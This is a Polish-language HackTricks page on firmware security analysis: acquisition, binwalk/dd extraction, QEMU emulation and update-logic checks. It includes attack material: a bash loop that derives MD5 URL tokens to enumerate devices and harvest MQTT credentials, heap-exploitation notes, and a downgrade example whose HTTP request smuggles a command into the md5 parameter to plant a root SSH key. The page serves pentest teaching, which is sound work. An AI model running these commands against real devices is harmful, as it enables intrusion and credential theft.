# Analiza Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia urządzeniom poprawne działanie, zarządzając i ułatwiając komunikację między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywane w pamięci nieulotnej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware to kluczowy krok w identyfikowaniu podatności bezpieczeństwa.

## **Zbieranie informacji**

**Zbieranie informacji** to krytyczny, początkowy etap zrozumienia budowy urządzenia i używanych przez nie technologii. Proces ten obejmuje gromadzenie danych na temat:

- architektury CPU i systemu operacyjnego, na którym działa
- szczegółów bootloader
- układu sprzętowego i datasheets
- metryk codebase i lokalizacji źródeł
- bibliotek zewnętrznych i typów licencji
- historii aktualizacji i certyfikacji regulacyjnych
- diagramów architektonicznych i przepływu
- ocen bezpieczeństwa i zidentyfikowanych podatności

W tym celu narzędzia **open-source intelligence (OSINT)** są bezcenne, podobnie jak analiza wszelkich dostępnych komponentów open-source software za pomocą ręcznych i automatycznych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują darmową statyczną analizę, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie Firmware**

Pozyskanie firmware można przeprowadzić na różne sposoby, z których każdy ma własny poziom złożoności:

- **Bezpośrednio** ze źródła (developerzy, producenci)
- **Budując** go z dostarczonych instrukcji
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Uzyskując bezpośredni dostęp do **cloud storage**, z narzędziami takimi jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **updates** za pomocą technik man-in-the-middle
- **Ekstrahując** z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffing** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i używając **hardcoded update endpoints**
- **Dumping** z bootloadera lub sieci
- **Usuwając i odczytując** układ storage, gdy wszystko inne zawiedzie, używając odpowiednich narzędzi hardware

### Tylko logi UART: wymuś root shell przez env U-Boot w flash

Jeśli UART RX jest ignorowany (tylko logi), nadal możesz wymusić init shell, **edytując blob środowiska U-Boot** offline:

1. Zrzut SPI flash za pomocą klipsa SOIC-8 + programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Znajdź partycję env U-Boot, zmień `bootargs`, aby zawierały `init=/bin/sh`, i **przelicz CRC32 środowiska U-Boot** dla bloba.
3. Zapisz ponownie tylko partycję env i uruchom ponownie; shell powinien pojawić się na UART.

To przydatne na urządzeniach embedded, gdzie shell bootloadera jest wyłączony, ale partycja env jest zapisywalna przez zewnętrzny dostęp do flash.

## Analiza firmware

Teraz, gdy **masz firmware**, musisz wyekstrahować o nim informacje, aby wiedzieć, jak się z nim obchodzić. Różne narzędzia, których możesz do tego użyć:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz wiele tymi narzędziami, sprawdź **entropy** obrazu za pomocą `binwalk -E <bin>`, jeśli jest niska, to raczej nie jest on encrypted. Jeśli wysoka, to prawdopodobnie jest encrypted (albo w jakiś sposób compressed).

Ponadto możesz użyć tych narzędzi do wyciągnięcia **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Albo [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do przeanalizowania pliku.

### Getting the Filesystem

Dzięki wcześniejszym komentowanym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś już być w stanie **extract the filesystem**.\
Binwalk zwykle wyciąga go do **folderu nazwanego od typu filesystem**, który zazwyczaj jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Czasami binwalk **nie będzie mieć magic byte filesystem w swoich signatures**. W takich przypadkach użyj binwalk, aby **znaleźć offset filesystem** i wyciąć skompresowany filesystem z binarki oraz **ręcznie wyextractować** filesystem zgodnie z jego typem, używając kroków poniżej.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące polecenie **dd** do wydobycia systemu plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można też uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki będą potem w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Dla filesystem ubifs z NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizowanie Firmware

Gdy firmware zostanie uzyskany, kluczowe jest jego rozłożenie na części w celu zrozumienia struktury i potencjalnych vulnerabilities. Ten proces polega na użyciu różnych narzędzi do analizy i wyodrębniania cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Zestaw poleceń służy do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają identyfikować typy plików, wyodrębniać strings, analizować dane binarne oraz poznawać szczegóły partycji i filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się **entropy** za pomocą `binwalk -E <bin>`. Niska entropy sugeruje brak szyfrowania, podczas gdy wysoka entropy wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **embedded files** zalecane są narzędzia i zasoby takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Extracting the Filesystem

Używając `binwalk -ev <bin>`, można zwykle wyodrębnić filesystem, często do katalogu nazwanego po typie filesystemu (np. squashfs, ubifs). Jednak gdy **binwalk** nie potrafi rozpoznać typu filesystemu z powodu brakujących magic bytes, konieczna jest ręczna ekstrakcja. Polega to na użyciu `binwalk` do znalezienia offsetu filesystemu, a następnie komendy `dd` do wycięcia filesystemu:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębnienia zawartości.

### Filesystem Analysis

Po wyodrębnieniu filesystemu rozpoczyna się poszukiwanie luk bezpieczeństwa. Zwraca się uwagę na insecure network daemons, hardcoded credentials, API endpoints, funkcje update server, niekompilowany kod, skrypty startowe oraz skompilowane binaria do offline analysis.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem credentials użytkowników
- certyfikaty SSL i klucze w **etc/ssl**
- pliki konfiguracyjne i skrypty pod kątem potencjalnych vulnerability
- osadzone binaria do dalszej analysis
- popularne web servery i binaria urządzeń IoT

Kilka tools pomaga w wykrywaniu sensitive information i vulnerability w filesystemie:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do static i dynamic analysis

### Security Checks on Compiled Binaries

Zarówno kod źródłowy, jak i skompilowane binaria znalezione w filesystemie muszą zostać dokładnie przeanalizowane pod kątem vulnerability. Tools takie jak **checksec.sh** dla binariów Unix oraz **PESecurity** dla binariów Windows pomagają identyfikować niezabezpieczone binaria, które można by exploituować.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Wiele IoT hubs pobiera per-device configuration z cloud endpointu, który wygląda tak:

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas firmware analysis możesz odkryć, że `<token>` jest lokalnie wyprowadzany z device ID przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako uppercase hex

Taki design pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać cloud config, często ujawniając plaintext MQTT credentials oraz topic prefixes.

Praktyczny workflow:

1) Extract deviceId z logów rozruchowych UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL cloud config i adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm token z firmware

- Załaduj binaria do Ghidra/radare2 i wyszukaj ścieżkę config ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień digest na uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Zbierz cloud config i poświadczenia MQTT

- Zbuduj URL i pobierz JSON za pomocą curl; przeanalizuj go z jq, aby wyodrębnić secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Nadużyj plaintext MQTT i słabych topic ACLs (jeśli są obecne)

- Użyj odzyskanych credentials, aby zasubskrybować maintenance topics i szukać sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Wyliczaj przewidywalne device IDs (na dużą skalę, z autoryzacją)

- Wiele ekosystemów osadza vendor OUI/product/type bytes, po których następuje sekwencyjny suffix.
- Możesz iterować po kandydujących IDs, wyprowadzać tokens i pobierać configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Zawsze uzyskaj wyraźną autoryzację przed próbą masowej enumeracji.
- Preferuj emulację lub static analysis, aby odzyskać sekrety bez modyfikowania docelowego hardware, gdy to możliwe.


Proces emulacji firmware umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. To podejście może napotkać problemy związane z zależnościami od hardware lub architektury, ale przeniesienie root filesystem lub konkretnych binary na urządzenie o zgodnej architekturze i endianness, takie jak Raspberry Pi, albo do wcześniej przygotowanej virtual machine, może ułatwić dalsze testy.

### Emulating Individual Binaries

Przy analizie pojedynczych programów kluczowe jest określenie endianness programu oraz architektury CPU.

#### Example with MIPS Architecture

Aby emulować binary w architekturze MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używany jest `qemu-mips`, a dla binariów little-endian wyborem będzie `qemu-mipsel`.

#### ARM Architecture Emulation

Dla binariów ARM proces jest podobny, z emulatorem `qemu-arm` używanym do emulacji.

### Full System Emulation

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne, ułatwiają pełną emulację firmware, automatyzując proces i wspierając dynamic analysis.

## Dynamic Analysis in Practice

Na tym etapie do analizy używa się albo prawdziwego, albo emulowanego środowiska urządzenia. Kluczowe jest utrzymanie dostępu shell do OS i filesystem. Emulacja może nie odwzorowywać idealnie interakcji sprzętowych, co czasem wymaga ponownego uruchamiania emulacji. Analiza powinna ponownie sprawdzać filesystem, wykorzystywać wystawione strony WWW i usługi sieciowe oraz badać podatności bootloadera. Testy integralności firmware są krytyczne, aby wykryć potencjalne podatności backdoor.

## Runtime Analysis Techniques

Runtime analysis polega na interakcji z process lub binarią w jego środowisku działania, z użyciem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpoints i identyfikowania podatności przez fuzzing oraz inne techniki.

Dla osadzonych targetów bez pełnego debugggera, **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapowanie wiadomości Zigbee / radio co-processor

Na hubach IoT stos RF jest często podzielony między **radio MCU** i proces działający w userland Linux. Użyteczny workflow polega na zmapowaniu ścieżki:

1. **RF frame** w eterze
2. parser po stronie kontrolera na radio MCU
3. tekstowy lub TLV protocol wysyłany przez serial/UART do Linux (na przykład `/dev/tty*`)
4. **application dispatcher** w głównym daemon
5. handler specyficzny dla protocol / state machine

Ta architektura tworzy dwa cele reverse engineering zamiast jednego. Jeśli kontroler zamienia binarne radio frames na tekstowy protocol taki jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **message groups** i tabele dispatch
- Które wiadomości mogą pochodzić z **network** versus z samego kontrolera
- Dokładne pola dyskryminatora **manufacturer-specific** (na przykład Zigbee `manufacturer_code` i custom `cluster_command`)
- Które handlery są osiągalne tylko podczas faz **commissioning**, discovery lub firmware/model download

Dla Zigbee w szczególności przechwyć pairing traffic i sprawdź, czy target nadal polega na domyślnym **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing commissioning traffic może ujawnić **Network Key**. Zigbee 3.0 install codes zmniejszają tę ekspozycję, więc zanotuj, czy testowane urządzenie faktycznie je egzekwuje.

### Handlery protocol specyficzne dla producenta i osiągalność sterowana przez FSM

Vendor-specific Zigbee/ZCL commands są często lepszym celem niż standardowe clusters, ponieważ trafiają do **custom parsing code** i wewnętrznych **FSMs** z mniej sprawdzoną walidacją.

Praktyczny workflow:

- Zreverse’uj command dispatcher, aż znajdziesz **vendor-only handler**.
- Odtwórz tabele **FSM state**, **event**, **check**, **action** i **next-state**.
- Zidentyfikuj **transitional states**, które auto-advance, oraz gałęzie retry/error, które ostatecznie resetują albo zwalniają stan kontrolowany przez atakującego.
- Potwierdź, które legalne wymiany protocol są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że buggy handler jest zawsze osiągalny.

Dla protocol wrażliwych na timing, replay packetów z frameworka Python może być zbyt wolny. Bardziej niezawodne podejście to emulacja legalnego urządzenia na prawdziwym hardware (na przykład **nRF52840**) z vendor-grade stack, dzięki czemu możesz ujawnić poprawne **endpoints**, **attributes** i timing commissioning.

### Klasa błędu fragmented-download w embedded daemons

Powtarzająca się klasa błędów firmware pojawia się w **fragmented blob/model/configuration downloads**:

1. **first fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Późniejsze fragmenty walidują tylko kontrolowane przez atakującego pola **packet-local**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **original allocated size**.

To pozwala atakującemu wysłać:

- Pierwszy poprawny fragment z **małym** zadeklarowanym total size, aby wymusić małą alokację heap.
- Późniejszy fragment z **expected offset**, ale większym `chunk_len`.
- Sfałszowany packet-local size, który spełnia świeże kontrole, a mimo to przepełnia oryginalnie zaalokowany bufor.

Gdy podatna ścieżka znajduje się za logiką commissioning, eksploatacja musi zawierać wystarczająco dużo **device emulation**, aby doprowadzić target do oczekiwanego stanu model-download lub blob-download przed wysłaniem zniekształconych fragmentów.

### Protocol-driven wyzwalacze `free()`

W embedded daemons najłatwiejszym sposobem na wyzwolenie heap metadata exploitation często nie jest „czekać na cleanup”, lecz **wymusić własną obsługę błędów protocol**:

- Wyślij zniekształcone kolejne fragmenty, aby popchnąć FSM do stanów **retry** lub **error**.
- Przekrocz próg retry, aby daemon **reset context** i zwolnił uszkodzony bufor.
- Użyj tego przewidywalnego `free()`, aby uruchomić primitives po stronie allocator przed awarią procesu z niepowiązanych powodów.

Jest to szczególnie użyteczne przeciwko allocatorom typu **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkadzanie metadata chunk może zamienić logikę unlink/unbin w write primitive. Stabilny wzorzec polega na uszkodzeniu pola **size**, aby przekierować traversal allocator do **fake chunks staged inside the overflowed buffer**, zamiast od razu nadpisywać rzeczywiste wskaźniki bin i powodować crash procesu.

## Binary Exploitation i Proof-of-Concept

Stworzenie PoC dla zidentyfikowanych podatności wymaga głębokiego zrozumienia architektury targetu i programowania w niższych poziomach abstrakcji. Binary runtime protections w embedded systems są rzadkie, ale gdy występują, techniki takie jak Return Oriented Programming (ROP) mogą być konieczne.

### Notatki o eksploitacji uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, więc każdy fake chunk musi przejść kontrole (sensowny size, `fd = 0` oraz otaczające chunki uznane za "in use").
- **Non-PIE binaries under ASLR:** jeśli ASLR jest włączone, ale główny binary jest **non-PIE**, adresy `.data/.bss` w binarce są stałe. Możesz zaatakować region, który już przypomina poprawny heap chunk header, aby umieścić fastbin allocation na **function pointer table**.
- **Parser-stopping NUL:** gdy JSON jest parsowany, `\x00` w payload może zatrzymać parsowanie, zachowując jednocześnie końcowe bajty kontrolowane przez atakującego do stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, który wywołuje `open("/proc/self/mem")`, `lseek()` i `write()`, może umieścić wykonywalny shellcode w znanym mapping i przeskoczyć do niego.

## Przygotowane systemy operacyjne do analizy Firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do security testing firmware, wyposażone w niezbędne narzędzia.

## Przygotowane OSs do analizy Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do wspierania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system oparty na Ubuntu 18.04, z preinstalowanymi narzędziami do security testing firmware.

## Ataki Firmware Downgrade i niebezpieczne mechanizmy update

Nawet gdy vendor implementuje kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed rollbackiem wersji (downgrade)** jest często pomijana. Gdy boot- lub recovery-loader weryfikuje tylko podpis za pomocą osadzonego public key, ale nie porównuje *wersji* (ani monotonicznego licznika) flashowanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma ważny podpis**, a więc ponownie wprowadzić załatane podatności.

Typowy workflow ataku:

1. **Zdobycie starszego signed image**
* Pobierz go z publicznego portalu download vendora, CDN lub strony wsparcia.
* Wyciągnij go z towarzyszących aplikacji mobile/desktop (np. w Android APK w `assets/firmware/`).
* Pobierz go z zewnętrznych repozytoriów, takich jak VirusTotal, archiwa internetowe, fora itd.
2. **Upload lub serwowanie obrazu do urządzenia** przez dowolny dostępny kanał update:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Wiele konsumenckich urządzeń IoT udostępnia *unauthenticated* HTTP(S) endpoints, które akceptują Base64-encoded firmware blobs, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade, exploituj podatność, która została załatana w nowszym wydaniu (na przykład filtr command-injection dodany później).
4. Opcjonalnie wgraj najnowszy obraz z powrotem albo wyłącz updates, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection po Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (obniżonym) firmware parametr `md5` jest konkatenowany bezpośrednio do polecenia shell bez sanitizacji, co pozwala na wstrzyknięcie dowolnych komend (tutaj – włączenie dostępu root przez SSH oparty na kluczach). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade sprawia, że ta poprawka jest bez znaczenia.

### Extracting Firmware From Mobile Apps

Wielu producentów pakuje pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby app mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Takie pakiety są zwykle przechowywane niezaszyfrowane w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` lub nawet zwykłe `unzip` pozwalają wyciągnąć podpisane obrazy bez dotykania fizycznego hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista kontrolna do oceny logiki update

* Czy transport/authentication *update endpoint* jest odpowiednio chroniony (TLS + authentication)?
* Czy urządzenie porównuje **version numbers** albo **monotonic anti-rollback counter** przed flashing?
* Czy image jest weryfikowany w secure boot chain (np. signatures sprawdzane przez ROM code)?
* Czy code w userland wykonuje dodatkowe sanity checks (np. allowed partition map, model number)?
* Czy *partial* albo *backup* update flows ponownie używają tej samej logiki validation?

> 💡  Jeśli któregokolwiek z powyższych brakuje, platforma jest prawdopodobnie podatna na rollback attacks.

## Vulnerable firmware do ćwiczeń

Aby ćwiczyć odkrywanie vulnerabilities w firmware, użyj poniższych vulnerable firmware projects jako punktu startowego.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
